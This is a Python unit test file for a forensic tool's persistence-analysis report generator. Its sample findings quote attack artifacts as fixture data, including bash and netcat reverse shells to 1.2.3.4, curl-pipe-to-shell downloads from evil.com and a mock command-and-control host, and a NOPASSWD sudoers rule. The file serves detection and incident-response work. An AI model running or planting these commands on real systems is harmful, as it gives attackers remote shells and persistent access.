# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Unit tests for report generator (JSON report and OpenRelik Markdown task report)."""

from __future__ import annotations

import json
import os
import tempfile

from openrelik_worker_common.reporting import Priority, Report

from src.utils.models import Finding, ReportMeta, RiskLevel
from src.utils.report_generator import (
    build_json_report,
    build_task_report,
    format_category_name,
    format_display_timestamp,
    format_os_display,
    format_technique_link,
    get_finding_title,
    get_highest_priority,
    get_risk_explanation,
    render_markdown_report,
    write_json_report,
)


def _create_sample_findings() -> list[Finding]:
    """Helper to construct findings matching Section 4.1/4.2 design document.

    Returns:
        List of sample Finding objects representing critical, high, medium, and info risks.
    """
    f1 = Finding(
        id="FINDING-001",
        category="cross_boundary_systemd",
        risk_level=RiskLevel.CRITICAL,
        technique_id="T1543.002",
        path="/etc/systemd/system/nginx-helper.service",
        details={
            "service_name": "nginx-helper.service",
            "exec_start": "/home/www-data/.local/bin/helper_daemon --background",
            "system_config_path": "/etc/systemd/system/nginx-helper.service",
            "target_binary_owner": "www-data",
            "target_binary_path": "/home/www-data/.local/bin/helper_daemon",
            "flags": [
                "SYSTEM_SERVICE_POINTS_TO_USER_HOME",
                "NON_ROOT_USER_PATH",
            ],
        },
        raw_content=(
            "[Unit]\n"
            "Description=Nginx Service Helper\n"
            "After=network.target\n\n"
            "[Service]\n"
            "ExecStart=/home/www-data/.local/bin/helper_daemon --background\n"
            "User=root\n"
            "Restart=always\n\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n"
        ),
    )

    f2 = Finding(
        id="FINDING-002",
        category="shell_rc_injection",
        risk_level=RiskLevel.HIGH,
        technique_id="T1546.004",
        path="/home/deploy/.bashrc",
        details={
            "user": "deploy",
            "flags": [
                "OBFUSCATED_COMMAND",
                "BASE64_PAYLOAD",
            ],
        },
        raw_content=(
            "# Append to end of .bashrc\necho 'ZXhhbXBsZSBjb21tYW5k' | base64 -d | sh"
        ),
        decoded_payload="curl -s http://malicious-command-control.internal/stage2.sh | bash",
    )

    f3 = Finding(
        id="FINDING-003",
        category="ssh_authorized_keys",
        risk_level=RiskLevel.MEDIUM,
        technique_id="T1098.004",
        path="/home/ubuntu/.ssh/authorized_keys",
        details={
            "user": "ubuntu",
            "key_comment": "deploy-bot@internal-ci",
            "flags": [
                "UNCOMMON_SSH_KEY_COMMENT",
            ],
        },
        raw_content="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ... deploy-bot@internal-ci",
    )

    return [f1, f2, f3]


def test_build_json_report_structure():
    """Verify build_json_report matches Section 4.1 specification."""
    meta = ReportMeta(
        os="linux",
        hostname="cloud-prod-web-01",
        analysis_timestamp="2026-10-30T14:22:01Z",
        total_findings=3,
    )
    findings = _create_sample_findings()

    json_report = build_json_report(meta, findings)

    assert "meta" in json_report
    assert "findings" in json_report

    assert json_report["meta"]["os"] == "linux"
    assert json_report["meta"]["hostname"] == "cloud-prod-web-01"
    assert json_report["meta"]["analysis_timestamp"] == "2026-10-30T14:22:01Z"
    assert json_report["meta"]["total_findings"] == 3

    assert len(json_report["findings"]) == 3
    finding_1 = json_report["findings"][0]
    assert finding_1["id"] == "FINDING-001"
    assert finding_1["category"] == "cross_boundary_systemd"
    assert finding_1["risk_level"] == "CRITICAL"
    assert finding_1["technique_id"] == "T1543.002"
    assert finding_1["path"] == "/etc/systemd/system/nginx-helper.service"
    assert (
        finding_1["details"]["target_binary_path"]
        == "/home/www-data/.local/bin/helper_daemon"
    )
    assert finding_1["details"]["flags"] == [
        "SYSTEM_SERVICE_POINTS_TO_USER_HOME",
        "NON_ROOT_USER_PATH",
    ]
    assert "ExecStart=" in finding_1["raw_content"]

    finding_2 = json_report["findings"][1]
    assert finding_2["id"] == "FINDING-002"
    assert finding_2["category"] == "shell_rc_injection"
    assert finding_2["risk_level"] == "HIGH"
    assert (
        finding_2["decoded_payload"]
        == "curl -s http://malicious-command-control.internal/stage2.sh | bash"
    )


def test_build_json_report_empty_findings():
    """Verify build_json_report handles an empty list of findings cleanly."""
    meta = ReportMeta(
        os="linux",
        hostname="clean-host",
        analysis_timestamp="2026-10-30T14:22:01Z",
        total_findings=0,
    )
    json_report = build_json_report(meta, [])

    assert json_report["meta"]["total_findings"] == 0
    assert json_report["findings"] == []


def test_write_json_report():
    """Verify write_json_report safely writes valid JSON and creates directories."""
    meta = ReportMeta(
        os="linux",
        hostname="test-host",
        analysis_timestamp="2026-10-30T14:22:01Z",
        total_findings=3,
    )
    findings = _create_sample_findings()

    with tempfile.TemporaryDirectory() as tmpdir:
        output_path = os.path.join(tmpdir, "nested", "persistence_report.json")
        result = write_json_report(output_path, meta, findings)

        assert os.path.exists(output_path)
        with open(output_path, "r", encoding="utf-8") as f:
            loaded = json.load(f)

        assert loaded == result
        assert loaded["meta"]["hostname"] == "test-host"
        assert len(loaded["findings"]) == 3


def test_render_markdown_report_full_content():
    """Verify Markdown report content matching Section 4.2 design document."""
    meta = ReportMeta(
        os="linux",
        hostname="cloud-prod-web-01",
        analysis_timestamp="2026-10-30T14:22:01Z",
        total_findings=3,
    )
    findings = _create_sample_findings()

    md = render_markdown_report(meta, findings)

    # 1. Header & Metadata
    assert "# 🔍 Persistence Analysis Report" in md
    assert "**Host System:** `cloud-prod-web-01`" in md
    assert "**OS Target:** Linux" in md
    assert "**Analysis Timestamp:** 2026-10-30 14:22:01 UTC" in md
    assert "**Total Persistence Artifacts Flagged:** 3" in md

    # 2. Findings Summary Table
    assert "## 📊 Findings Summary" in md
    assert "| Risk Level | Count | Primary Categories |" in md
    assert "| 🔴 **CRITICAL** | 1 | Cross-Boundary Systemd Execution |" in md
    assert "| 🟠 **HIGH** | 1 | Shell RC Script Injection |" in md
    assert "| 🟡 **MEDIUM** | 1 | SSH Authorized Keys |" in md
    assert "| 🟢 **INFO** | 0 | None |" in md

    # 3. Critical & High Section
    assert "## 🚨 Critical & High Risk Findings" in md
    assert "### 1. [CRITICAL] Systemd Service Points to User Home Directory" in md
    assert (
        "* **Technique:** MITRE ATT&CK [T1543.002](https://attack.mitre.org/techniques/T1543/002/)"
        in md
    )
    assert "* **Configuration File:** `/etc/systemd/system/nginx-helper.service`" in md
    assert "* **Target Executable:** `/home/www-data/.local/bin/helper_daemon`" in md
    assert (
        "* **Flags:** `SYSTEM_SERVICE_POINTS_TO_USER_HOME`, `NON_ROOT_USER_PATH`" in md
    )
    assert "#### Executable Configuration Details" in md
    assert "```ini" in md

    assert "### 2. [HIGH] Encoded Payload in User Shell Profile" in md
    assert (
        "* **Technique:** MITRE ATT&CK [T1546.004](https://attack.mitre.org/techniques/T1546/004/)"
        in md
    )
    assert "* **Configuration File:** `/home/deploy/.bashrc`" in md
    assert "* **Target User:** `deploy`" in md
    assert "* **Flags:** `OBFUSCATED_COMMAND`, `BASE64_PAYLOAD`" in md
    assert "#### Extracted Raw Payload" in md
    assert "#### Decoded Execution Preview" in md
    assert "curl -s http://malicious-command-control.internal/stage2.sh | bash" in md

    # 4. Medium & Low Section
    assert "## ⚠️ Medium & Low Risk Findings" in md
    assert "### 3. [MEDIUM] New SSH Public Key Added to User Directory" in md
    assert (
        "* **Technique:** MITRE ATT&CK [T1098.004](https://attack.mitre.org/techniques/T1098/004/)"
        in md
    )
    assert "* **Configuration File:** `/home/ubuntu/.ssh/authorized_keys`" in md
    assert "* **Target User:** `ubuntu`" in md
    assert "* **Key Comment:** `deploy-bot@internal-ci`" in md
    assert "* **Flags:** `UNCOMMON_SSH_KEY_COMMENT`" in md
    assert "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ..." in md

    # 5. Next Actions for Analyst
    assert "## 💡 Recommended Next Actions for Analyst" in md
    assert (
        "1. Inspect the binary at `/home/www-data/.local/bin/helper_daemon` using an inspection worker or hash reputation lookup."
        in md
    )
    assert (
        "2. Review network connection logs around `2026-10-30` associated with user `deploy`."
        in md
    )
    assert (
        "3. Verify if `deploy-bot@internal-ci` is an authorized deployment key on this instance."
        in md
    )


def test_build_task_report_priority_mapping():
    """Verify Report.priority maps correctly to Priority enum values."""
    meta = ReportMeta(os="linux", hostname="host-a")

    # Critical finding present -> Priority.CRITICAL (80)
    crit_finding = Finding(
        id="F-1",
        category="cross_boundary_systemd",
        risk_level=RiskLevel.CRITICAL,
        path="/etc/systemd/system/a.service",
    )
    high_finding = Finding(
        id="F-2",
        category="shell_rc_injection",
        risk_level=RiskLevel.HIGH,
        path="/home/user/.bashrc",
    )
    med_finding = Finding(
        id="F-3",
        category="ssh_authorized_keys",
        risk_level=RiskLevel.MEDIUM,
        path="/home/user/.ssh/authorized_keys",
    )
    info_finding = Finding(
        id="F-4",
        category="xdg_autostart",
        risk_level=RiskLevel.INFO,
        path="/home/user/.config/autostart/app.desktop",
    )

    r_crit = build_task_report(
        meta, [crit_finding, high_finding, med_finding, info_finding]
    )
    assert r_crit.priority == Priority.CRITICAL
    assert r_crit.priority.value == 80

    # Highest is HIGH -> Priority.HIGH (40)
    r_high = build_task_report(meta, [high_finding, med_finding, info_finding])
    assert r_high.priority == Priority.HIGH
    assert r_high.priority.value == 40

    # Highest is MEDIUM -> Priority.MEDIUM (20)
    r_med = build_task_report(meta, [med_finding, info_finding])
    assert r_med.priority == Priority.MEDIUM
    assert r_med.priority.value == 20

    # Highest is INFO -> Priority.INFO (5)
    r_info = build_task_report(meta, [info_finding])
    assert r_info.priority == Priority.INFO
    assert r_info.priority.value == 5

    # No findings -> Priority.LOW (10)
    r_empty = build_task_report(meta, [])
    assert r_empty.priority == Priority.LOW
    assert r_empty.priority.value == 10


def test_build_task_report_to_dict():
    """Verify Report object produces valid dictionary via to_dict()."""
    meta = ReportMeta(
        os="linux",
        hostname="test-box",
        analysis_timestamp="2026-10-30 14:22:01 UTC",
    )
    findings = _create_sample_findings()

    report = build_task_report(meta, findings)
    assert isinstance(report, Report)

    report_dict = report.to_dict()
    assert report_dict["title"] == "🔍 Persistence Analysis Report"
    assert "content" in report_dict
    assert report_dict["priority"] == Priority.CRITICAL.value
    assert "Persistence analysis flagged 3" in report_dict["summary"]

    # to_markdown matches render_markdown_report
    assert report.to_markdown() == render_markdown_report(meta, findings)


def test_markdown_report_empty_findings():
    """Verify Markdown report handles an empty findings list gracefully."""
    meta = ReportMeta(
        os="linux",
        hostname="empty-host",
        analysis_timestamp="2026-10-30T14:22:01Z",
        total_findings=0,
    )
    md = render_markdown_report(meta, [])

    assert "**Total Persistence Artifacts Flagged:** 0" in md
    assert "*No critical or high-risk persistence mechanisms detected.*" in md
    assert "*No medium or low-risk persistence mechanisms detected.*" in md
    assert (
        "No critical persistence anomalies requiring immediate remediation were identified."
        in md
    )


def test_markdown_report_custom_details_and_fallbacks():
    """Verify finding title, explanation, and custom recommendation overrides."""
    meta = ReportMeta(
        os="macos",
        hostname="macbook-pro",
        analysis_timestamp="2026-10-30 12:00:00",
        total_findings=1,
    )
    f = Finding(
        id="F-100",
        category="custom_persistence",
        risk_level=RiskLevel.MEDIUM,
        technique_id="T1547.015",
        path="/Library/LaunchDaemons/com.example.plist",
        details={
            "title": "Custom Launch Daemon Added",
            "risk_explanation": "A custom launch daemon was scheduled to execute on boot.",
            "recommendation": "Review plist file permissions and code signing signature.",
            "target_executable": "/usr/local/bin/custom_daemon",
            "flags": ["UNTRUSTED_BINARY_PATH"],
        },
        raw_content="<plist><dict><key>Label</key><string>com.example</string></dict></plist>",
    )

    md = render_markdown_report(meta, [f])

    assert "**OS Target:** macOS" in md
    assert "### 1. [MEDIUM] Custom Launch Daemon Added" in md
    assert (
        "* **Risk Explanation:** A custom launch daemon was scheduled to execute on boot."
        in md
    )
    assert "1. Review plist file permissions and code signing signature." in md
    assert "* **Flags:** `UNTRUSTED_BINARY_PATH`" in md
    assert "#### Configuration Details" in md


def test_helper_functions():
    """Test individual string and metadata formatting helper functions."""
    # format_category_name
    assert (
        format_category_name("cross_boundary_systemd")
        == "Cross-Boundary Systemd Execution"
    )
    assert format_category_name("ld_preload") == "Dynamic Linker Preload"
    assert format_category_name("unknown_new_vector") == "Unknown New Vector"
    assert format_category_name("") == "Unknown"

    # format_os_display
    assert format_os_display("linux") == "Linux"
    assert format_os_display("windows") == "Windows"
    assert format_os_display("macos") == "macOS"
    assert format_os_display("darwin") == "macOS"
    assert format_os_display("") == "Unknown"

    # format_display_timestamp
    assert format_display_timestamp("2026-10-30T14:22:01Z") == "2026-10-30 14:22:01 UTC"
    assert (
        format_display_timestamp("2026-10-30T14:22:01+00:00")
        == "2026-10-30 14:22:01+00:00"
    )
    assert (
        format_display_timestamp("2026-10-30 14:22:01 UTC") == "2026-10-30 14:22:01 UTC"
    )
    assert format_display_timestamp("") == "N/A"

    # format_technique_link
    assert (
        format_technique_link("T1543.002")
        == "MITRE ATT&CK [T1543.002](https://attack.mitre.org/techniques/T1543/002/)"
    )
    assert (
        format_technique_link("T1098")
        == "MITRE ATT&CK [T1098](https://attack.mitre.org/techniques/T1098/)"
    )
    assert format_technique_link("") == "None"

    # get_finding_title fallback
    f_ld = Finding(category="ld_preload", path="/etc/ld.so.preload")
    assert get_finding_title(f_ld) == "Dynamic Linker Preload Detected"

    # get_risk_explanation fallback
    f_cron = Finding(category="cron_job", path="/etc/crontab")
    assert "Scheduled cron task configured" in get_risk_explanation(f_cron)

    # get_highest_priority
    assert get_highest_priority([]) == Priority.LOW


def test_additional_categories_and_recommendations():
    """Verify title, explanation, code block, and recommendation coverage across categories."""
    findings = [
        Finding(
            id="F-CB-CRON",
            category="cross_boundary_cron",
            risk_level=RiskLevel.CRITICAL,
            technique_id="T1053.003",
            path="/etc/crontab",
            details={
                "target_binary_path": "/home/user/script.sh",
                "flags": "SINGLE_STRING_FLAG",
            },
            raw_content="* * * * * root /home/user/script.sh",
        ),
        Finding(
            id="F-CB-INIT",
            category="cross_boundary_init",
            risk_level=RiskLevel.CRITICAL,
            technique_id="T1037.004",
            path="/etc/rc.local",
            details={
                "target_executable": "/tmp/evil.sh",
            },
            raw_content="/tmp/evil.sh &",
        ),
        Finding(
            id="F-CB-SUDO",
            category="cross_boundary_sudoers",
            risk_level=RiskLevel.CRITICAL,
            technique_id="T1548.003",
            path="/etc/sudoers.d/custom",
            details={
                "target_executable": "/var/tmp/run.sh",
            },
        ),
        Finding(
            id="F-CB-AUTO",
            category="cross_boundary_autostart",
            risk_level=RiskLevel.CRITICAL,
            technique_id="T1547.013",
            path="/etc/xdg/autostart/bad.desktop",
            details={
                "target_executable": "/dev/shm/app",
            },
        ),
        Finding(
            id="F-SHELL-REV",
            category="shell_rc_injection",
            risk_level=RiskLevel.HIGH,
            technique_id="T1546.004",
            path="/root/.bashrc",
            details={
                "user": "root",
                "flags": ["REVERSE_SHELL"],
            },
            raw_content="bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        ),
        Finding(
            id="F-SHELL-PROMPT",
            category="shell_profiles",
            risk_level=RiskLevel.HIGH,
            technique_id="T1546.004",
            path="/etc/profile",
            details={
                "user": "alice",
                "flags": ["PROMPT_COMMAND"],
            },
            raw_content='PROMPT_COMMAND="curl evil.com"',
        ),
        Finding(
            id="F-SSH-CMD",
            category="ssh_authorized_keys",
            risk_level=RiskLevel.HIGH,
            technique_id="T1098.004",
            path="/root/.ssh/authorized_keys",
            details={
                "flags": ["SSH_FORCED_COMMAND"],
            },
            raw_content='command="/bin/sh" ssh-rsa AAA...',
        ),
        Finding(
            id="F-LD",
            category="ld_preload",
            risk_level=RiskLevel.CRITICAL,
            technique_id="T1574.006",
            path="/etc/ld.so.preload",
            details={
                "flags": ["LD_PRELOAD_FILE_PRESENT"],
            },
            raw_content="/usr/local/lib/hook.so",
        ),
        Finding(
            id="F-SUDO",
            category="sudoers",
            risk_level=RiskLevel.HIGH,
            technique_id="T1548.003",
            path="/etc/sudoers",
            details={
                "flags": ["SUDOERS_NOPASSWD_ALL"],
            },
            raw_content="alice ALL=(ALL) NOPASSWD: ALL",
        ),
        Finding(
            id="F-PAM",
            category="pam_module",
            risk_level=RiskLevel.HIGH,
            technique_id="T1556.003",
            path="/etc/pam.d/common-auth",
            details={
                "flags": ["PAM_NON_STANDARD_MODULE"],
            },
            raw_content="auth required /tmp/pam_evil.so",
        ),
        Finding(
            id="F-CRON-REV",
            category="cron_job",
            risk_level=RiskLevel.HIGH,
            technique_id="T1053.003",
            path="/etc/cron.d/job",
            details={
                "flags": ["CRON_REVERSE_SHELL"],
            },
            raw_content="* * * * * root /bin/nc -e /bin/sh 1.2.3.4 9999",
        ),
        Finding(
            id="F-CRON-DL",
            category="cron_job",
            risk_level=RiskLevel.HIGH,
            technique_id="T1053.003",
            path="/etc/cron.daily/updater",
            details={
                "flags": ["CRON_DOWNLOAD_AND_EXECUTE"],
            },
            raw_content="curl https://evil.com/payload | sh",
        ),
        Finding(
            id="F-CRON-STD",
            category="cron_job",
            risk_level=RiskLevel.INFO,
            technique_id="T1053.003",
            path="/etc/cron.hourly/logrotate",
            raw_content="/usr/sbin/logrotate /etc/logrotate.conf",
        ),
        Finding(
            id="F-SYS-TMP",
            category="systemd_service",
            risk_level=RiskLevel.HIGH,
            technique_id="T1543.002",
            path="/etc/systemd/system/tmp.service",
            details={
                "flags": ["SUSPICIOUS_PATH_TMP"],
            },
            raw_content="[Unit]\n[Service]\nExecStart=/tmp/daemon",
        ),
        Finding(
            id="F-SYS-STD",
            category="systemd_service",
            risk_level=RiskLevel.INFO,
            technique_id="T1543.002",
            path="/lib/systemd/system/ssh.service",
            raw_content="[Unit]\n[Service]\nExecStart=/usr/sbin/sshd",
        ),
        Finding(
            id="F-AUTO",
            category="xdg_autostart",
            risk_level=RiskLevel.MEDIUM,
            technique_id="T1547.013",
            path="/etc/xdg/autostart/login.desktop",
            raw_content="[Desktop Entry]\nExec=/opt/login-helper",
        ),
        Finding(
            id="F-GENERIC",
            category="miscellaneous",
            risk_level=RiskLevel.INFO,
            path="/etc/issue",
            details={"target_binary_owner": "root"},
            raw_content="Ubuntu 24.04",
        ),
    ]

    meta = ReportMeta(
        os="linux",
        hostname="server-01",
        analysis_timestamp="2026-10-30T00:00:00Z",
    )
    md = render_markdown_report(meta, findings)

    assert "Cron Job Points to User Home Directory" in md
    assert "Init Script Points to User Home Directory" in md
    assert "Sudoers Rule Points to User Path" in md
    assert "Desktop Autostart Points to User Home Directory" in md
    assert "Reverse Shell Injected into User Shell Profile" in md
    assert "Prompt Command Hook Injected into User Shell Profile" in md
    assert "SSH Authorized Key with Forced Command Execution" in md
    assert "Dynamic Linker Preload Detected" in md
    assert "Privileged Sudoers Configuration" in md
    assert "Non-Standard PAM Module Configuration" in md
    assert "Cron Job with Reverse Shell Command" in md
    assert "Cron Job Downloading and Executing Remote Script" in md
    assert "Systemd Service Executing from Temporary Directory" in md
    assert "Suspicious XDG Desktop Autostart Entry" in md
    assert "Immediately investigate preloaded shared object libraries" in md
    assert "Review elevated privileges and NOPASSWD entries" in md
    assert "Audit PAM authentication modules" in md
    assert "Audit scheduled cron jobs" in md
    assert "Verify systemd service unit integrity" in md
